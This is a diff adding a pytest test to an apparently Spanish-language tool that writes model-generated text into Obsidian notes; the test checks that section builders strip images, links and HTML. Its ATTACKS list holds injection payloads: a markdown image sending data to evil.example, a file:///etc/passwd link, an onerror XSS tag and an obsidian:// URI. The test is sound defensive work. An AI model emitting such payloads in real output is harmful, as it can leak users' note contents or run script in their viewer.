@@ -238,3 +238,35 @@ def test_links_offers_the_library_and_writes_the_file_name(cfg, engine):
     text, _, _ = acts.compose(cfg, idea(), "links", "", "2026-10-12")
     assert "000000000001 | WireGuard | Redes" in engine.calls[0][1]
     assert text == f"*Entre: tu biblioteca.*\n\n- [[{path.stem}]] — la vpn"
+
+
+# --- final review: model text is text in Obsidian too ----------------------
+
+ATTACKS = ["![](https://evil.example/?d=idea)", "!![x](https://evil.example)",
+           "[mira](file:///etc/passwd)", "<img src=x onerror=alert(1)>",
+           "[x](obsidian://open?vault=v)"]
+
+
+@pytest.mark.parametrize("attack", ATTACKS)
+def test_model_text_cannot_become_an_image_a_link_or_html(attack):
+    def written(make):
+        # Dropped altogether is as safe as made inert: `<...>` reads as the
+        # prompt's own placeholder and never reaches the note.
+        try:
+            return make()
+        except AnalysisError:
+            return ""
+
+    sections = [
+        written(lambda: acts.exists_section(found(verdict="similar", difference=attack, matches=[
+            {"name": "n", "url": "https://ok.com", "note": attack}]), "es", "d", "m")),
+        written(lambda: acts.improve_section({"items": [{"weak": attack, "fix": attack}]})),
+        written(lambda: acts.expand_section({"items": [attack]})),
+        written(lambda: acts.links_section({"links": [{"id": "1", "why": attack}]},
+                                           {"1": "s"}, "R", "es")),
+    ]
+    for text in sections:
+        assert "![" not in text
+        assert "](file:" not in text and "](obsidian:" not in text
+        assert "](https://evil" not in text
+        assert "<img" not in text
